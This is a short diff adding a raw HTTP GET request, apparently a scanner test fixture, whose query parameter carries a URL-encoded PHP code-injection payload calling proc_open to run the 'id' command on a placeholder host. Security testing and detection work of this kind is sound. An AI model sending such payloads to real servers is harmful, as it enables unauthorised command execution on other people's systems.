@@ -1,0 +1,4 @@
+GET /a?name=v%3Dproc_open('id',array(),array()) HTTP/1.1
+Host: demo.example.com
+Connection: close
+
